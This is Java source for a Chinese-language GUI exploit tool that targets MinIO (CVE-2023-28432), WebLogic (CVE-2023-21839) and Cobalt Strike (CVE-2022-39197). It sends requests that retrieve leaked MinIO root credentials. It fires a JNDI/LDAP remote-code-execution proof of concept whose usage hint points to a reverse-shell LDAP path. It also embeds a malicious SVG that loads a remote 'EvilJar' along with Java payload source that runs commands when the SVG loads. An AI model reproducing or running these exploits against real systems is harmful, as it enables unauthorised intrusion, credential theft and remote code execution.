import javafx.application.Application;
import javafx.collections.FXCollections;
import javafx.beans.value.ObservableValue;
import javafx.beans.value.ChangeListener;
import javafx.event.ActionEvent;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.control.ChoiceBox;
import javafx.scene.control.Label;
import javafx.scene.control.TextArea;
import javafx.scene.image.Image;
import javafx.scene.layout.AnchorPane;
import javafx.stage.Stage;
import java.util.Date;
import java.text.SimpleDateFormat;
import java.text.DateFormat;

public class GuiDemo extends Application {      
    String result = null;
    Date d = new Date();
    //DateFormat time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    String time = null;
    String payload =null;

    public void start(Stage GuiDemo) {
        GuiDemo.setTitle("GUI-poc-test  by:rc9");
        GuiDemo.setMaxWidth(700);
        GuiDemo.setMaxHeight(500);

        Label l = new Label("请输入URL");
        l.setLayoutX(10);
        l.setLayoutY(15);
        l.setPrefWidth(70);
        l.setPrefHeight(20);

        TextArea textArea = new TextArea();
        textArea.setText("请在右侧下拉栏选择poc");
        textArea.setLayoutX(80);
        textArea.setLayoutY(10);
        textArea.setPrefWidth(250);
        textArea.setPrefHeight(10);

        String strings[] = {"cs RCE", "weblogic RCE", "minio 信息泄漏"};
        ChoiceBox choiceBox = new ChoiceBox(FXCollections.observableArrayList(strings));
        choiceBox.setLayoutX(360);
        choiceBox.setLayoutY(15);
        choiceBox.setPrefHeight(20);
        choiceBox.setPrefWidth(70);

        Button button = new Button("检测");
        button.setLayoutX(450);
        button.setLayoutY(15);
        button.setPrefWidth(70);
        button.setPrefHeight(20);

        TextArea textArea1 = new TextArea();
        textArea1.setLayoutX(10);
        textArea1.setLayoutY(130);
        textArea1.setPrefHeight(300);
        textArea1.setPrefWidth(500);

        textArea1.setWrapText(true);    //设置文本框里的文字自动换行
        textArea1.setText("MinIO verify 接口敏感信息泄露漏洞分析(CVE-2023-28432)\n" +
                "Weblogic 未授权远程代码执行漏洞 (CVE-2023-21839)\n" +
                "Cobalt Strike 存储型xss漏洞,可rce(CVE-2022-39197)");

        //添加执行命令文字提示
        Label l1 = new Label("请输入命令");
        l1.setLayoutX(10);
        l1.setLayoutY(70);
        l1.setPrefWidth(70);
        l1.setPrefHeight(20);
        //添加命令文本框
        TextArea textArea2 = new TextArea();
        textArea2.setLayoutX(80);
        textArea2.setLayoutY(60);
        textArea2.setPrefHeight(20);
        textArea2.setPrefWidth(250);

        //添加执行按钮
        Button button1 = new Button("执行");
        button1.setLayoutX(360);
        button1.setLayoutY(70);
        button1.setPrefHeight(20);
        button1.setPrefWidth(50);

        textArea2.setText("请输入命令...");


        //添加一个pane，用来装填按钮等插件
        AnchorPane anchorPane = new AnchorPane();
        anchorPane.getChildren().addAll(textArea,choiceBox,button,l,textArea1,l1,textArea2,button1);
        Scene scene = new Scene(anchorPane, 600, 700);
        GuiDemo.setScene(scene);
        GuiDemo.show();

        final String[] name = {null};   //用来接收用户选项
        //设置下拉列表监听事件
        choiceBox.getSelectionModel().selectedIndexProperty().addListener(new ChangeListener<Number>() {
            public void changed(ObservableValue ov, Number value, Number new_value) {
                String ChoiceBox_Name = strings[new_value.intValue()];
                name[0] = ChoiceBox_Name;   //赋值
                textArea2.setText("请先检测是否存在漏洞");  //提示
                if(name[0].equalsIgnoreCase("minio 信息泄漏")){
                    textArea.setText("请输入ip，默认端口9000");  //规范输入
                    textArea1.setText("[0] 漏洞前提:MinIO被配置为集群模式\n"+
                            "[1] 用法:输入目标ip,无需输入端口,默认9000\n\n");
                } else if (name[0].equalsIgnoreCase("weblogic RCE")) {
                    textArea.setText(null);
                    textArea2.setText(null);
                    textArea1.setText("[0] 请自行搭建ldap服务器,用法:\n" +
                            "[1] 请输入目标ip:端口,例如127.0.0.1:7001\n" +
                            "[2] 命令输入ldap地址,例如xx.dnslog.cn,点击检测按钮查看结果\n"+
                            "[3] 无需点击执行按钮,点击检测按钮配合ldap服务器即可查看执行效果\n\n");
                } else if (name[0].equalsIgnoreCase("cs RCE")) {
                    textArea.setText("点击检测查看反制方法");
                    textArea2.setText(null);
                    //自查
                    textArea1.setText("[+] 自查方法:\n"+
                            "[0] 受影响版本:Cobalt Strike <= 4.7\n"+
                            "[1] 启动cobaltstrike客户端\n"+
                            "[2] 添加监听器，修改名称处输入检测代码：\n"+
                            "<html><object classid='org.apache.batik.swing.JSVGCanvas'><param name='URI' value='http://xxx.dnslog.cn/a.svg'></object>"+
                            "\n[3] value处url输入dnslog地址,查看回显即可检测\n"+
                            "[4] 或者输入任意地址svg查看能否访问\n"+
                            "[**] 注意:url地址需以http开头\n\n");
                }
            }
        });

        //添加检测按钮功能
        button.setOnAction(event -> {
            String url = textArea.getText();  //接收url
            payload=textArea2.getText();  //接收命令
            if (name[0].equalsIgnoreCase("minio 信息泄漏")) {
                    //调用httptemp类，将返回结果赋值给result变量
                    try{
                        result = HttpTemp.HTTP("http://"+url+":9000/minio/bootstrap/v1/verify","POST",null);
                    }catch (Exception e){
                        result =e.toString();
                        d =new Date();
                        time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(d);
                        textArea1.appendText("[-]"+time+" "+url+" 未发现漏洞\n");
                        textArea2.setText("请先检测是否存在漏洞");
                    }

                    //结果匹配：不区分大小写
                    boolean result1 = result.toUpperCase().contains("MINIO_ROOT_PASSWORD") || result.toUpperCase().contains("MINIO_ROOT_USER")|| result.toUpperCase().contains("MINIOENV");
                    if (result1) {
                        d =new Date();
                        time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(d);
                        textArea1.appendText("[+] "+time+" "+url+" 存在漏洞！\n");  //textArea1是结果显示栏
                        textArea2.setText("无需输入命令，点击执行获取敏感信息");
                    }

                    //执行exp
                    button1.setOnAction(event1 -> { //button1：执行按钮
                            if(result1){
                                d =new Date();
                                time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(d);
                                textArea1.appendText("[+]"+time+" "+url+" 返回结果：\n"+result+"\n");
                            }
                    });
            }
            else if (name[0].equalsIgnoreCase("weblogic RCE")){
                if(url == null || payload == null){
                    textArea1.appendText("[*]用法：目标ip:端口 ldap地址,都不能空！\ne.g. 192.168.1.1:7001 192.168.1.2:1389/Basic/ReverseShell/192.168.1.2/1111\n");
                }else {
                    CVE_2023_21839.poc(url,payload);
                    d =new Date();
                    time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(d);
                    textArea1.appendText("[+] 目标:"+url+",请求已发送"+time+" 自行查看dnslog/ldap服务器检查结果\n");
                }
            }
            else if (name[0].equalsIgnoreCase("cs RCE")){

                textArea1.appendText("[+] 反制方法:\n"+
                        "[0] 前提：本地已获取到对方木马(beacon.exe)\n"+
                        "[1] 反制环境要求：win,python3,pip3安装frida-tools\n"+
                        "[2] python已加入环境变量\n"+
                        "[3] 自行准备恶意svg文件,jar包,对方能访问到\n" +
                        "[4] 命令输入exe绝对路径和svg地址,空格隔开,点击执行实现反制\n"+
                        "[payload eg]:beacon.exe http://127.0.0.1:4444/evil.svg\n\n");

                textArea1.appendText("[示例] svg源码:\n"+
                                "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.0\">\n" +
                                        "<script type=\"application/java-archive\" xlink:href=\"http://127.0.0.1:9898/EvilJar-calc.jar\"/>\n" +
                                        "<text>CVE-2022-39197</text>\n" +
                                        "</svg>"+"\n\n"+
                                "[示例] jar包里的恶意代码源码:弹出计算器,适用不同系统:macos/linux/windows,注意安装依赖,按需修改payload\n"+
                                "import org.w3c.dom.events.Event;\n" +
                                        "import org.w3c.dom.events.EventListener;\n" +
                                        "import org.w3c.dom.svg.EventListenerInitializer;\n" +
                                        "import org.w3c.dom.svg.SVGDocument;\n" +
                                        "import org.w3c.dom.svg.SVGSVGElement;\n" +
                                        "import java.util.*;\n" +
                                        "import java.io.*;\n" +
                                        "public class Exploit implements EventListenerInitializer {\n" +
                                        "    public void initializeEventListeners(SVGDocument document) {\n" +
                                        "        SVGSVGElement root = document.getRootElement();\n" +
                                        "        EventListener listener = new EventListener() {\n" +
                                        "            public void handleEvent(Event event) {\n" +
                                        "                try {\n" +
                                        "                    String OS = System.getProperty(\"os.name\", \"unknown\").toLowerCase(Locale.ROOT);\n" +
                                        "                    if (OS.contains(\"win\")) {\n" +
                                        "                        Runtime.getRuntime().exec(\"calc.exe\");\n" +
                                        "                    } else if (OS.contains(\"mac\")) {\n" +
                                        "                        Runtime.getRuntime().exec(\"open -a calculator\");\n" +
                                        "                    } else if (OS.contains(\"nux\")) {\n" +
                                        "                        Runtime.getRuntime().exec(\"/usr/bin/mate-calc\");\n" +
                                        "                    }\n" +
                                        "                } catch (Exception e) {}\n" +
                                        "            }\n" +
                                        "        };\n" +
                                        "        root.addEventListener(\"SVGLoad\", listener, false);\n" +
                                        "    }\n" +
                                        "}\n\n"
                                );
                //button1：执行按钮,反制
                button1.setOnAction(event2 -> {
                    payload=textArea2.getText();  //接收命令
                    if (name[0].equalsIgnoreCase("cs RCE")){
                        if (payload== null){
                            textArea1.appendText("[*]命令不能空！\ne.g:beacon.exe http://127.0.0.1:4444/evil.svg\n\n");
                        }
                        else{
                            d = new Date();
                            time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(d);
                            textArea1.appendText("[+]运行成功！" + time + "自行查看结果：\n");
                            textArea1.appendText(cs_rce.poc(payload));}
                    }
                });
                }
            else {
                textArea1.setText("未发现漏洞,或请求异常");
            }
        });
        }
    public static void main(String args[]) {
        launch(args);
    }
}
